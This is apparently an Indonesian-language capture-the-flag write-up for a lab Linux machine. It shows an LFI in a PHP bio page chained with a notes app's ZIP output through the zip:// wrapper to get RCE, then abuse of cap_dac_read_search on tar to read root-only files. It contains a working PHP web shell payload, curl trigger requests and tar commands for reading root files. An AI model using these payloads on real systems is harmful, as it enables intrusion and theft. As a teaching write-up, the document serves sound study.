**Kategori:** Linux, Web Exploitation, Privilege Escalation 
**Tingkat Kesulitan:** Moderate 
**Target:** 10.1.2.140

---

## 1. Ringkasan

Target merupakan mesin Linux yang menjalankan tiga aplikasi web berbeda di port 80 (`/shop/`, `/bio/`, `/notes/`). Initial access diperoleh melalui rantai eksploitasi **Local File Inclusion (LFI) pada `/bio/` yang dikombinasikan dengan fitur upload/penyimpanan catatan pada `/notes/`**, memanfaatkan PHP stream wrapper `zip://` untuk mencapai Remote Code Execution (RCE). Privilege escalation ke root dicapai melalui penyalahgunaan Linux capability `cap_dac_read_search` yang secara tidak sengaja diberikan pada binary `/usr/bin/tar`.

---

## 2. Reconnaissance

### 2.1 Port Scanning


```bash
rustscan -a 10.1.2.140 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Hasil:**

|Port|Service|Versi|
|---|---|---|
|22|SSH|OpenSSH 9.1p1 Debian 2|
|80|HTTP|Apache httpd 2.4.54 (Debian)|

### 2.2 Directory & Content Enumeration

```bash
feroxbuster -u http://10.1.2.140/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 100 --filter-status 404,400 -k --dont-filter \
  -x html,php,txt --redirects --no-recursion -o 80.txt
```

Ditemukan tiga aplikasi web terpisah pada root directory:

| Path      | Deskripsi                                                  |
| --------- | ---------------------------------------------------------- |
| `/shop/`  | Website template "MultiShop" (statis, Bootstrap + jQuery)  |
| `/bio/`   | Aplikasi "Rick and Morty" character bio                    |
| `/notes/` | Aplikasi "Noter"  form input catatan dengan fitur download |

Fingerprinting tambahan dengan `whatweb` mengonfirmasi stack masing-masing aplikasi (Apache 2.4.54 Debian, PHP, jQuery 3.4.1).

---

## 3. Analisis Kerentanan: LFI pada `/bio/`

### 3.1 Identifikasi Parameter

Halaman `/bio/` memuat elemen JavaScript yang mengarah pada parameter GET `name`:

```javascript
const $loadNext = document.querySelector('#load-next')
$loadNext.addEventListener('click', async () => {
    window.location = "?name=morty"
})
```

### 3.2 Path Traversal Test

Pengujian path traversal pada parameter `name`:

```
http://10.1.2.140/bio/?name=../../../../../../etc/passwd
```

**Response:**

```
Warning: include(../../../../../../etc/passwd.txt): Failed to open stream: 
No such file or directory in /var/www/html/bio/index.php on line 21

Warning: include(): Failed opening '../../../../../../etc/passwd.txt' for 
inclusion (include_path='.:/usr/share/php') in /var/www/html/bio/index.php 
on line 21
```

Error ini mengonfirmasi dua hal penting:

1. Parameter `name` diproses langsung oleh fungsi `include()` tanpa sanitasi.
2. Server secara otomatis menambahkan ekstensi `.txt` pada akhir input sebelum diproses.

### 3.3 Root Cause

Source code `/var/www/html/bio/index.php` (diperoleh setelah RCE tercapai) mengonfirmasi akar masalah:

```php
<?php 
    if (!isset($_GET["name"])){
        include("rick.txt");
    }else{
        include($_GET["name"].".txt");
    }
?>
```

Parameter `name` dikonkatenasi langsung ke dalam pemanggilan `include()` tanpa validasi, whitelist, maupun sanitasi path merupakan kerentanan **LFI (CWE-98: PHP Remote/Local File Inclusion)** klasik.

---

## 4. Eksploitasi: LFI to RCE via Zip Wrapper

### 4.1 Analisis Fitur Pendukung: `/notes/`

Aplikasi `/notes/` menyediakan form yang mengirim data ke `download.php` dengan parameter `note` (isi catatan) dan `filename`. Pengujian menunjukkan bahwa setiap submission menghasilkan response redirect ke sebuah arsip ZIP:

```bash
curl -X POST http://10.1.2.140/notes/download.php \
  -d "note=<?php system(\$_GET['cmd']); ?>&filename=x" -i
```

```
HTTP/1.1 302 Found
location: tmp/99.zip
```

Inspeksi isi arsip mengonfirmasi bahwa konten parameter `note` disimpan sebagai file bernama `<id>.txt` di dalam ZIP:

```bash
unzip -l note99.zip
# 99.txt
```

### 4.2 Chaining: Zip Wrapper + Auto-Append Extension

Kerentanan LFI pada `/bio/` menambahkan suffix `.txt` secara otomatis pada input `name`. Karakteristik ini justru dapat dimanfaatkan bersamaan dengan PHP stream wrapper `zip://`, yang menerima format:

```
zip://<path-to-archive>#<internal-filename>
```

Dengan mengirimkan payload **tanpa** ekstensi `.txt`, server akan menambahkannya secara otomatis sehingga hasil akhirnya **match persis** dengan nama file internal ZIP (`<id>.txt`) yang telah dibuat melalui `/notes/`.

### 4.3 Eksekusi Payload

**Langkah 1 Simpan payload PHP melalui `/notes/`:**

```bash
curl -X POST http://10.1.2.140/notes/download.php \
  -d "note=<?php system(\$_GET['cmd']); ?>&filename=x" -i
```

```
HTTP/1.1 302 Found
location: tmp/99.zip
```

**Langkah 2 — Trigger inklusi via `zip://` wrapper pada `/bio/`:**

```bash
curl -s "http://10.1.2.140/bio/?name=zip:///var/www/html/notes/tmp/99.zip%2399&cmd=id"
```

`%23` merupakan encoded character untuk `#` (pemisah path arsip dan nama file internal pada wrapper `zip://`).

**Response:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick and morty</title>
</head>
<body>
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
</body>
</html>
```

**Remote Code Execution berhasil dicapai** sebagai user `www-data`.

---

## 5. Post-Exploitation

### 5.1 Stabilisasi Akses

Command execution awal diperoleh melalui request HTTP satu arah (non-interaktif). Untuk efisiensi kerja, dilakukan pivot ke reverse shell menggunakan payload berbasis `bash`/`python3` yang dikirim melalui parameter `cmd`.

### 5.2 User Flag

```bash
cat /home/apiez/user.txt
```

```
a29d427f4**************
```

### 5.3 Enumerasi Privilege Escalation

Proses enumerasi standar dilakukan meliputi:

- `sudo -l` → `www-data` tidak memiliki hak sudo (`may not run sudo on multishop`)
- SUID binaries → seluruhnya binary standar bawaan Debian, tidak ada yang dapat dieksploitasi
- Cron jobs (`/etc/crontab`, `/etc/cron.d/`, `/etc/cron.daily/`) → seluruhnya job bawaan sistem
- File/direktori writable milik root → tidak ditemukan yang signifikan

Pemeriksaan Linux capabilities menghasilkan temuan kunci:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/ping cap_net_raw=ep
/usr/bin/tar  cap_dac_read_search=ep
```

> **Catatan:** Temuan ini tidak terdeteksi pada hasil otomatis `linpeas.sh`, kemungkinan disebabkan oleh keterbatasan eksekusi pada shell non-interaktif atau timeout saat scanning filesystem secara menyeluruh. Verifikasi manual tetap krusial dan tidak boleh hanya bergantung pada tooling otomatis.

---

## 6. Privilege Escalation: Capability Abuse pada `tar`

### 6.1 Analisis Kerentanan

Capability `cap_dac_read_search` yang melekat pada binary `/usr/bin/tar` memungkinkan proses `tar` **melewati seluruh pengecekan permission untuk operasi baca (read)** pada filesystem, terlepas dari user yang menjalankannya. Hal ini memungkinkan user `www-data` (yang normalnya tidak memiliki akses ke direktori `/root/`) untuk membaca file apa pun di sistem, termasuk file yang dimiliki eksklusif oleh `root`.

Ini merupakan teknik privilege escalation yang terdokumentasi pada [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#capabilities).

### 6.2 Eksploitasi

```bash
tar cf /tmp/root.tar /root/root.txt
tar xf /tmp/root.tar -O
```

**Penjelasan command:**

|Command|Fungsi|
|---|---|
|`tar cf /tmp/root.tar /root/root.txt`|Membuat (`c`) arsip baru ke file (`f`) `/tmp/root.tar` berisi `/root/root.txt`. Karena capability `cap_dac_read_search`, proses ini dapat membaca isi direktori `/root/` (permission `700`, hanya owner) meskipun dijalankan sebagai `www-data`.|
|`tar xf /tmp/root.tar -O`|Mengekstrak (`x`) arsip dari file (`f`) `/tmp/root.tar`, dengan output diarahkan ke stdout (`-O`) sehingga isi file langsung ditampilkan di terminal tanpa perlu menulis ulang file ke disk.|

### 6.3 Root Flag

```
d1ba6******************
```